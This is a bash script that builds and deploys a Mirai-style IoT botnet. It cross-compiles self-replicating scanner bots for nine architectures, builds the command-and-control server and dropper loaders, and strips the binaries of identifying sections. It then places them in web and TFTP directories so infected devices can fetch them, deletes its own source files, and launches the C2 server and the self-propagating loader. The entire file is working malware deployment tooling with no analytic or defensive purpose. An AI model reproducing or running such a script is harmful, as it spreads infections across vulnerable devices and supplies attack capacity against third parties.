#!/bin/bash
# gcc -std=c99 bot/*.c -DDEBUG -static -DIOCTL -DSCANNER -g -o dbg
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/x86_64/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/sparc/bin

export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; 
go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords

compile_bot() {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

compile_arm7() {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
}

mkdir ~/release 
go build -o server cnc/*

gcc -static -O3 -lpthread -pthread ~/loader/*.c -o ~/loader/loader
go build -o /root/loader/listen /root/listener.go

armv4l-gcc -Os -D BOT_ARCH=\"arm\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/loader/dlr/main.c -o ~/loader/dlr/release/dlr.arm
armv5l-gcc -Os -D BOT_ARCH=\"arm5\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/loader/dlr/main.c -o ~/loader/dlr/release/dlr.arm5
armv7l-gcc -Os -D BOT_ARCH=\"arm7\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/loader/dlr/main.c -o ~/loader/dlr/release/dlr.arm7
x86_64-gcc -Os -D BOT_ARCH=\"x86\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/loader/dlr/main.c -o ~/loader/dlr/release/dlr.x86
mips-gcc -Os -D BOT_ARCH=\"mips\" -D MIPS -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/loader/dlr/main.c -o ~/loader/dlr/release/dlr.mips
mipsel-gcc -Os -D BOT_ARCH=\"mipsel\" -D MIPSEL -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/loader/dlr/main.c -o ~/loader/dlr/release/dlr.mipsel
sh4-gcc -Os -D BOT_ARCH=\"sh4\" -D SH4 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/loader/dlr/main.c -o ~/loader/dlr/release/dlr.sh4
m68k-gcc -Os -D BOT_ARCH=\"m68k\" -D M68K -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/loader/dlr/main.c -o ~/loader/dlr/release/dlr.m68k
sparc-gcc -Os -D BOT_ARCH=\"spc\" -D SPARC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/loader/dlr/main.c -o ~/loader/dlr/release/dlr.spc

armv4l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/loader/dlr/release/dlr.arm
armv5l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/loader/dlr/release/dlr.arm5
armv7l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/loader/dlr/release/dlr.arm7
x86_64-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/loader/dlr/release/dlr.x86
mips-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/loader/dlr/release/dlr.mips
mipsel-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/loader/dlr/release/dlr.mipsel
sh4-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/loader/dlr/release/dlr.sh4
m68k-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/loader/dlr/release/dlr.m68k
sparc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/loader/dlr/release/dlr.spc

mv ~/loader/dlr/release/dlr* ~/loader/dlr/
compile_bot armv4l a.arm "-static -DIOCTL -DSCANNER -DSELFREP"
compile_bot armv5l a.arm5 "-DIOCTL -DSCANNER -DSELFREP"
compile_arm7 armv7l a.arm7 "-static -DIOCTL -DSCANNER -DSELFREP"
compile_bot x86_64 a.x86 "-static -DIOCTL -DSCANNER -DSELFREP"
compile_bot mips a.mips "-static -DIOCTL -DSCANNER -DSELFREP"
compile_bot mipsel a.mipsel "-static -DIOCTL -DSCANNER -DSELFREP"
compile_bot sh4 a.sh4 "-static -DIOCTL -DSCANNER -DSELFREP"
compile_bot m68k a.m68k "-static -DIOCTL -DSCANNER -DSELFREP"
compile_bot sparc a.spc "-static -DIOCTL -DSCANNER -DSELFREP"

mkdir /var/www/html
cp release/a.* /var/www/html/
cp release/a.* /var/lib/tftpboot/

rm -rf ~/release ~/cnc ~/listener.go ~/*.sh ~/bot ~/Projects
rm -rf ~/loader/headers ~/loader/*.c ~/loader/dlr/*.c ~/loader/release
screen -dmS server ./server
cd ~/loader/
screen -dmS listener ./listen | ./loader selfrep
cd ~/
python build_payload.py